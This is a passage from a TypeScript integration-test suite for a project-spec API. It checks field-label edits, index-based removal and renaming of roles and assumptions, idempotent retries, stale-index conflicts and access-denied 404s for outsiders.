    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(ownerToken) });
    await collectSSE(buildRes);

    const ownerRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/label`, {
      method: "PATCH",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ label: "השם המלא" }),
    });
    assert.equal(ownerRes.status, 200);
    const { project: relabeled } = (await ownerRes.json()) as {
      project: { spec: { entities: { name: string; fields: { name: string; label?: string }[] }[] } };
    };
    const renamedEntity = relabeled.spec.entities.find((e) => e.name === entityName)!;
    const renamedField = renamedEntity.fields.find((f) => f.name === fieldName)!;
    assert.equal(renamedField.label, "השם המלא");
    assert.equal(renamedField.name, fieldName, "the field's real name (and therefore its real column) must be untouched");

    // The real data table must still work after the label change.
    const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}`, { headers: authHeaders(ownerToken) });
    assert.equal(listRes.status, 200);

    const collabRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/label`, {
      method: "PATCH",
      headers: authHeaders(collabToken),
      body: JSON.stringify({ label: "Relabeled by the collaborator" }),
    });
    assert.equal(collabRes.status, 200);
    const { project: relabeledByCollab } = (await collabRes.json()) as {
      project: { spec: { entities: { name: string; fields: { name: string; label?: string }[] }[] } };
    };
    const collabField = relabeledByCollab.spec.entities.find((e) => e.name === entityName)!.fields.find((f) => f.name === fieldName)!;
    assert.equal(collabField.label, "Relabeled by the collaborator");
  });
});

/** Round 960: same withIdempotency gap, and the same fix, as the entity-label PATCH route's own round-960 fix just above -- see its own comment. */
test("PATCH .../fields/:fieldName/label retried with the same idempotency key after a newer edit landed in between replays the original response, instead of reverting the newer edit back to the stale value", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-label-idem@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as {
      project: { id: string; spec: { entities: { name: string; fields: { name: string }[] }[] } };
    };
    const entityName = project.spec.entities[0].name;
    const fieldName = project.spec.entities[0].fields[0].name;

    const headers = { ...authHeaders(token), "x-idempotency-key": "field-label-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/label`, {
      method: "PATCH",
      headers,
      body: JSON.stringify({ label: "Stale Label" }),
    });
    assert.equal(firstRes.status, 200);
    const firstBody = await firstRes.json();

    const newerRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/label`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "Fresher Label" }),
    });
    assert.equal(newerRes.status, 200);

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/label`, {
      method: "PATCH",
      headers,
      body: JSON.stringify({ label: "Stale Label" }),
    });
    assert.equal(retryRes.status, 200);
    assert.deepEqual(await retryRes.json(), firstBody, "a retry with the same idempotency key must replay the original response verbatim, not re-run the mutation");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: current } = (await getRes.json()) as {
      project: { spec: { entities: { name: string; fields: { name: string; label?: string }[] }[] } };
    };
    const currentField = current.spec.entities.find((e) => e.name === entityName)!.fields.find((f) => f.name === fieldName)!;
    assert.equal(currentField.label, "Fresher Label", "the retry must never revert the genuinely newer edit back to the stale label");
  });
});

test("renaming a field's label rejects an empty or whitespace-only value", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-label-owner2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as {
      project: { id: string; spec: { entities: { name: string; fields: { name: string }[] }[] } };
    };
    const entityName = project.spec.entities[0].name;
    const fieldName = project.spec.entities[0].fields[0].name;

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/label`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "   " }),
    });
    assert.equal(res.status, 400);
  });
});

test("renaming a non-existent field's label 404s with FIELD_NOT_FOUND", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-label-owner3@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    const entityName = project.spec.entities[0].name;

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/NoSuchField/label`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "Anything" }),
    });
    assert.equal(res.status, 404);
    assert.equal(((await res.json()) as { code?: string }).code, "FIELD_NOT_FOUND");
  });
});

test("renaming a field's label on a project you have no access to still 404s, the same as any other project route", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "field-label-owner4@example.com");
    const outsiderToken = await signup(baseUrl, "field-label-outsider4@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as {
      project: { id: string; spec: { entities: { name: string; fields: { name: string }[] }[] } };
    };
    const entityName = project.spec.entities[0].name;
    const fieldName = project.spec.entities[0].fields[0].name;

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/label`, {
      method: "PATCH",
      headers: authHeaders(outsiderToken),
      body: JSON.stringify({ label: "Hijacked Label" }),
    });
    assert.equal(res.status, 404);
  });
});

test("the owner can remove a role chip by index, and a collaborator can too -- the remaining roles keep their own relative order", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "role-remove-owner1@example.com");
    const collabToken = await signup(baseUrl, "role-remove-collab1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({
        description: "A CRM with customers and deals, used by a sales manager and a customer portal for self-service.",
      }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { roles: string[] } } };
    assert.ok(project.spec.roles.length >= 3, "this description matches Manager and Customer, plus Admin is always added");
    const originalRoles = project.spec.roles;
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "role-remove-collab1@example.com" }),
    });

    const ownerRes = await fetch(`${baseUrl}/api/projects/${project.id}/roles/0`, {
      method: "DELETE",
      headers: authHeaders(ownerToken),
    });
    assert.equal(ownerRes.status, 200);
    const { project: afterFirstRemoval } = (await ownerRes.json()) as { project: { spec: { roles: string[] } } };
    assert.deepEqual(
      afterFirstRemoval.spec.roles,
      originalRoles.slice(1),
      "removing index 0 must drop only the first role, keeping the rest in their original order",
    );

    const collabRes = await fetch(`${baseUrl}/api/projects/${project.id}/roles/0`, {
      method: "DELETE",
      headers: authHeaders(collabToken),
    });
    assert.equal(collabRes.status, 200);
    const { project: afterSecondRemoval } = (await collabRes.json()) as { project: { spec: { roles: string[] } } };
    assert.deepEqual(afterSecondRemoval.spec.roles, originalRoles.slice(2), "a collaborator can remove a role too, same as the owner");
  });
});

test("removing a role at an out-of-range index 404s with ROLE_NOT_FOUND, and the role list is left untouched", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "role-remove-owner2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { roles: string[] } } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/roles/${project.spec.roles.length}`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(res.status, 404);
    assert.equal(((await res.json()) as { code?: string }).code, "ROLE_NOT_FOUND");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: unchanged } = (await getRes.json()) as { project: { spec: { roles: string[] } } };
    assert.deepEqual(unchanged.spec.roles, project.spec.roles);
  });
});

test("removing the last remaining role is rejected with 400 instead of crashing -- ProductSpecSchema requires roles.min(1)", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "role-remove-lastone@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { roles: string[] } } };
    assert.equal(project.spec.roles.length, 2, "this description matches no ROLE_RULES keyword, so it's exactly Admin + the Member fallback");

    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/roles/0`, { method: "DELETE", headers: authHeaders(token) });
    assert.equal(firstRes.status, 200, "removing down to exactly one remaining role must still succeed");

    const secondRes = await fetch(`${baseUrl}/api/projects/${project.id}/roles/0`, { method: "DELETE", headers: authHeaders(token) });
    assert.equal(secondRes.status, 400, "removing the very last role must be rejected, not crash");
    assert.equal(((await secondRes.json()) as { code?: string }).code, "VALIDATION_ERROR");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: unchanged } = (await getRes.json()) as { project: { spec: { roles: string[] } } };
    assert.equal(unchanged.spec.roles.length, 1, "the one remaining role must survive the rejected attempt untouched");
  });
});

test("removing a role on a project you have no access to still 404s, the same as any other project route", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "role-remove-owner3@example.com");
    const outsiderToken = await signup(baseUrl, "role-remove-outsider3@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/roles/0`, {
      method: "DELETE",
      headers: authHeaders(outsiderToken),
    });
    assert.equal(res.status, 404);
  });
});

test("the owner can remove an assumption by index, and a collaborator can too -- the remaining assumptions keep their own relative order", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "assumption-remove-owner1@example.com");
    const collabToken = await signup(baseUrl, "assumption-remove-collab1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { assumptions: string[] } } };
    assert.ok(project.spec.assumptions.length >= 2, "the heuristic engine always generates several assumptions");
    const originalAssumptions = project.spec.assumptions;
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "assumption-remove-collab1@example.com" }),
    });

    const ownerRes = await fetch(`${baseUrl}/api/projects/${project.id}/assumptions/1`, {
      method: "DELETE",
      headers: authHeaders(ownerToken),
    });
    assert.equal(ownerRes.status, 200);
    const { project: afterFirstRemoval } = (await ownerRes.json()) as { project: { spec: { assumptions: string[] } } };
    assert.deepEqual(
      afterFirstRemoval.spec.assumptions,
      [originalAssumptions[0], ...originalAssumptions.slice(2)],
      "removing index 1 must drop only the middle assumption, keeping the others in their original order",
    );

    const collabRes = await fetch(`${baseUrl}/api/projects/${project.id}/assumptions/0`, {
      method: "DELETE",
      headers: authHeaders(collabToken),
    });
    assert.equal(collabRes.status, 200);
    const { project: afterSecondRemoval } = (await collabRes.json()) as { project: { spec: { assumptions: string[] } } };
    assert.deepEqual(
      afterSecondRemoval.spec.assumptions,
      originalAssumptions.slice(2),
      "a collaborator can remove an assumption too, same as the owner",
    );
  });
});

test("removing an assumption at an out-of-range index 404s with ASSUMPTION_NOT_FOUND, and the assumptions list is left untouched", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "assumption-remove-owner2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { assumptions: string[] } } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/assumptions/${project.spec.assumptions.length}`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(res.status, 404);
    assert.equal(((await res.json()) as { code?: string }).code, "ASSUMPTION_NOT_FOUND");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: unchanged } = (await getRes.json()) as { project: { spec: { assumptions: string[] } } };
    assert.deepEqual(unchanged.spec.assumptions, project.spec.assumptions);
  });
});

test("removing an assumption on a project you have no access to still 404s, the same as any other project route", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "assumption-remove-owner3@example.com");
    const outsiderToken = await signup(baseUrl, "assumption-remove-outsider3@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/assumptions/0`, {
      method: "DELETE",
      headers: authHeaders(outsiderToken),
    });
    assert.equal(res.status, 404);
  });
});

test("removing a role at a non-numeric index 404s the same as an out-of-range one, instead of coercing to NaN", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "role-remove-owner4@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/roles/not-a-number`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(res.status, 404);
    assert.equal(((await res.json()) as { code?: string }).code, "ROLE_NOT_FOUND");
  });
});

test("the owner can rename a role chip by index in place, and a collaborator can too -- renaming never changes the array's own length or order", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "role-rename-owner1@example.com");
    const collabToken = await signup(baseUrl, "role-rename-collab1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({
        description: "A CRM with customers and deals, used by a sales manager and a customer portal for self-service.",
      }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { roles: string[] } } };
    assert.ok(project.spec.roles.length >= 3, "this description matches Manager and Customer, plus Admin is always added");
    const originalRoles = project.spec.roles;
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "role-rename-collab1@example.com" }),
    });

    const ownerRes = await fetch(`${baseUrl}/api/projects/${project.id}/roles/0`, {
      method: "PATCH",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ role: "Warehouse Manager" }),
    });
    assert.equal(ownerRes.status, 200);
    const { project: afterFirstRename } = (await ownerRes.json()) as { project: { spec: { roles: string[] } } };
    assert.deepEqual(
      afterFirstRename.spec.roles,
      ["Warehouse Manager", ...originalRoles.slice(1)],
      "renaming index 0 must replace only that role in place, at the same position",
    );

    const collabRes = await fetch(`${baseUrl}/api/projects/${project.id}/roles/1`, {
      method: "PATCH",
      headers: authHeaders(collabToken),
      body: JSON.stringify({ role: "Renamed By Collaborator" }),
    });
    assert.equal(collabRes.status, 200);
    const { project: afterSecondRename } = (await collabRes.json()) as { project: { spec: { roles: string[] } } };
    assert.equal(afterSecondRename.spec.roles.length, originalRoles.length, "renaming must never change the list's length");
    assert.equal(afterSecondRename.spec.roles[1], "Renamed By Collaborator", "a collaborator can rename a role too, same as the owner");
  });
});

test("renaming a role at an out-of-range index 404s with ROLE_NOT_FOUND, and the role list is left untouched", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "role-rename-owner2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { roles: string[] } } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/roles/${project.spec.roles.length}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ role: "Anything" }),
    });
    assert.equal(res.status, 404);
    assert.equal(((await res.json()) as { code?: string }).code, "ROLE_NOT_FOUND");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: unchanged } = (await getRes.json()) as { project: { spec: { roles: string[] } } };
    assert.deepEqual(unchanged.spec.roles, project.spec.roles);
  });
});

test("renaming a role to an empty string is rejected with 400 instead of silently blanking it", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "role-rename-empty@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { roles: string[] } } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/roles/0`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ role: "   " }),
    });
    assert.equal(res.status, 400);
    assert.equal(((await res.json()) as { code?: string }).code, "VALIDATION_ERROR");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: unchanged } = (await getRes.json()) as { project: { spec: { roles: string[] } } };
    assert.deepEqual(unchanged.spec.roles, project.spec.roles, "a rejected rename must leave the role list completely untouched");
  });
});

test("renaming a role on a project you have no access to still 404s, the same as any other project route", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "role-rename-owner3@example.com");
    const outsiderToken = await signup(baseUrl, "role-rename-outsider3@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/roles/0`, {
      method: "PATCH",
      headers: authHeaders(outsiderToken),
      body: JSON.stringify({ role: "Hijacked Role" }),
    });
    assert.equal(res.status, 404);
  });
});

test("the owner can rename an assumption by index in place, and a collaborator can too -- renaming never changes the array's own length or order", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "assumption-rename-owner1@example.com");
    const collabToken = await signup(baseUrl, "assumption-rename-collab1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { assumptions: string[] } } };
    assert.ok(project.spec.assumptions.length >= 2, "the heuristic engine always generates several assumptions");
    const originalAssumptions = project.spec.assumptions;
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "assumption-rename-collab1@example.com" }),
    });

    const ownerRes = await fetch(`${baseUrl}/api/projects/${project.id}/assumptions/0`, {
      method: "PATCH",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ assumption: "Only one warehouse" }),
    });
    assert.equal(ownerRes.status, 200);
    const { project: afterFirstRename } = (await ownerRes.json()) as { project: { spec: { assumptions: string[] } } };
    assert.deepEqual(
      afterFirstRename.spec.assumptions,
      ["Only one warehouse", ...originalAssumptions.slice(1)],
      "renaming index 0 must replace only that assumption in place, at the same position",
    );

    const collabRes = await fetch(`${baseUrl}/api/projects/${project.id}/assumptions/1`, {
      method: "PATCH",
      headers: authHeaders(collabToken),
      body: JSON.stringify({ assumption: "Renamed by collaborator" }),
    });
    assert.equal(collabRes.status, 200);
    const { project: afterSecondRename } = (await collabRes.json()) as { project: { spec: { assumptions: string[] } } };
    assert.equal(
      afterSecondRename.spec.assumptions.length,
      originalAssumptions.length,
      "renaming must never change the list's length",
    );
    assert.equal(
      afterSecondRename.spec.assumptions[1],
      "Renamed by collaborator",
      "a collaborator can rename an assumption too, same as the owner",
    );
  });
});

test("renaming an assumption at an out-of-range index 404s with ASSUMPTION_NOT_FOUND, and the assumptions list is left untouched", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "assumption-rename-owner2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { assumptions: string[] } } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/assumptions/${project.spec.assumptions.length}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ assumption: "Anything" }),
    });
    assert.equal(res.status, 404);
    assert.equal(((await res.json()) as { code?: string }).code, "ASSUMPTION_NOT_FOUND");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: unchanged } = (await getRes.json()) as { project: { spec: { assumptions: string[] } } };
    assert.deepEqual(unchanged.spec.assumptions, project.spec.assumptions);
  });
});

test("renaming an assumption on a project you have no access to still 404s, the same as any other project route", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "assumption-rename-owner3@example.com");
    const outsiderToken = await signup(baseUrl, "assumption-rename-outsider3@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/assumptions/0`, {
      method: "PATCH",
      headers: authHeaders(outsiderToken),
      body: JSON.stringify({ assumption: "Hijacked assumption" }),
    });
    assert.equal(res.status, 404);
  });
});

/**
 * New in this round (421): roles/assumptions are addressed by plain array
 * index (unlike entities/fields, addressed by their own stable name), so
 * two overlapping remove/rename requests -- a user clicking two different
 * chips before either response lands -- could previously have the second
 * request's index silently land on whatever entry the first request's
 * removal shifted into that same slot, mutating the wrong role/assumption
 * with no error at all. These repro the exact race end-to-end (not just
 * unit-test the guard function) and confirm the fix: the client now always
 * sends the exact string it had on screen as `expect`, and the server
 * rejects the second, now-stale request (409) instead of silently acting
 * on the wrong entry.
 */
test("deleting a role at a now-stale index is rejected (409) instead of silently removing the wrong role", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "role-stale-index1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        description: "A CRM with customers and deals, used by a sales manager and a customer portal for self-service.",
      }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { roles: string[] } } };
    assert.ok(project.spec.roles.length >= 3);
    const [first, second] = project.spec.roles;

    // Simulates the exact race: two chips' remove buttons are clicked
    // before either response lands, so both requests were built against
    // the original list -- index 0 ("first") and index 1 ("second").
    const firstRemoval = await fetch(`${baseUrl}/api/projects/${project.id}/roles/0`, {
      method: "DELETE",
      headers: authHeaders(token),
      body: JSON.stringify({ expect: first }),
    });
    assert.equal(firstRemoval.status, 200);

    // Without the fix, this would delete whatever now sits at index 1
    // (no longer "second" -- the first removal already shifted it to
    // index 0) instead of being told its target has moved.
    const secondRemoval = await fetch(`${baseUrl}/api/projects/${project.id}/roles/1`, {
      method: "DELETE",
      headers: authHeaders(token),
      body: JSON.stringify({ expect: second }),
    });
    assert.equal(secondRemoval.status, 409);
    assert.equal(((await secondRemoval.json()) as { code?: string }).code, "ROLE_STALE_INDEX");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: afterBoth } = (await getRes.json()) as { project: { spec: { roles: string[] } } };
    assert.ok(afterBoth.spec.roles.includes(second), "the role the user actually clicked to remove must survive the rejected stale request");
    assert.equal(afterBoth.spec.roles.length, project.spec.roles.length - 1, "only the first, non-stale removal actually happened");
  });
});

test("DELETE/PATCH roles and assumptions without an `expect` field still work unchanged (back-compat for direct API callers)", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "role-no-expect1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { roles: string[]; assumptions: string[] } } };

    const renameRes = await fetch(`${baseUrl}/api/projects/${project.id}/roles/0`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ role: "Renamed, no expect sent" }),
    });
    assert.equal(renameRes.status, 200);

    const removeRes = await fetch(`${baseUrl}/api/projects/${project.id}/assumptions/0`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(removeRes.status, 200);
  });
});

test("renaming a role at a now-stale index is rejected (409) instead of silently renaming the wrong role", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "role-stale-rename1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        description: "A CRM with customers and deals, used by a sales manager and a customer portal for self-service.",
      }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { roles: string[] } } };
    assert.ok(project.spec.roles.length >= 3);
    const [first, second] = project.spec.roles;

    const firstRemoval = await fetch(`${baseUrl}/api/projects/${project.id}/roles/0`, {
      method: "DELETE",
      headers: authHeaders(token),
      body: JSON.stringify({ expect: first }),
    });
    assert.equal(firstRemoval.status, 200);

    const staleRename = await fetch(`${baseUrl}/api/projects/${project.id}/roles/1`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ role: "Oops wrong one", expect: second }),
    });
    assert.equal(staleRename.status, 409);
    assert.equal(((await staleRename.json()) as { code?: string }).code, "ROLE_STALE_INDEX");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: afterBoth } = (await getRes.json()) as { project: { spec: { roles: string[] } } };
    assert.ok(afterBoth.spec.roles.includes(second), "the role the user actually clicked to rename must survive untouched");
    assert.ok(!afterBoth.spec.roles.includes("Oops wrong one"), "the stale-indexed rename must not have been applied to any role");
  });
});

/**
 * Round 943: the sibling entity/field DELETE routes already got
 * withIdempotency protection in round 941; these six index-addressed
 * roles/assumptions/personas DELETE and PATCH routes never did. A response
 * lost in transit after a removal/rename already succeeded means
 * fetchWithWakeRetry's retry runs assertIndexStillMatches against the
 * already-shifted/already-renamed list -- throwing a confusing
 * *_STALE_INDEX for a mutation that, from the user's point of view,
 * already fully succeeded. Mirrors round 941's own identical fix/test
 * shape for the entity/field routes, one test per route.
 */
test("DELETE .../roles/:index retried with the same idempotency key after the first attempt already succeeded replays the original 200, instead of a stale-index conflict", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "role-remove-idem@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals, used by a sales manager and a customer portal for self-service." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { roles: string[] } } };
    assert.ok(project.spec.roles.length >= 3);
    const first = project.spec.roles[0];

    const headers = { ...authHeaders(token), "x-idempotency-key": "role-remove-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/roles/0`, {
      method: "DELETE",
      headers,
      body: JSON.stringify({ expect: first }),
    });
    assert.equal(firstRes.status, 200);
    const { project: afterFirst } = (await firstRes.json()) as { project: { spec: { roles: string[] } } };
    assert.ok(!afterFirst.spec.roles.includes(first), "the role must genuinely be gone after the first call");

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/roles/0`, {
      method: "DELETE",
      headers,
      body: JSON.stringify({ expect: first }),
    });
    assert.equal(
      retryRes.status,
      200,
      "a retried removal with the same idempotency key must replay the original success, not a stale-index conflict on the already-removed role",
    );
    const { project: afterRetry } = (await retryRes.json()) as { project: { spec: { roles: string[] } } };
    assert.deepEqual(afterRetry.spec.roles, afterFirst.spec.roles, "the replayed response must match the original success exactly");
  });
});

test("PATCH .../roles/:index retried with the same idempotency key after the first attempt already succeeded replays the original 200, instead of a stale-index conflict", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "role-rename-idem@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { roles: string[] } } };
    const original = project.spec.roles[0];

    const headers = { ...authHeaders(token), "x-idempotency-key": "role-rename-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/roles/0`, {
      method: "PATCH",
      headers,
      body: JSON.stringify({ role: "Renamed Role", expect: original }),
    });
    assert.equal(firstRes.status, 200);
    const { project: afterFirst } = (await firstRes.json()) as { project: { spec: { roles: string[] } } };
    assert.equal(afterFirst.spec.roles[0], "Renamed Role", "the role must genuinely be renamed after the first call");

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/roles/0`, {
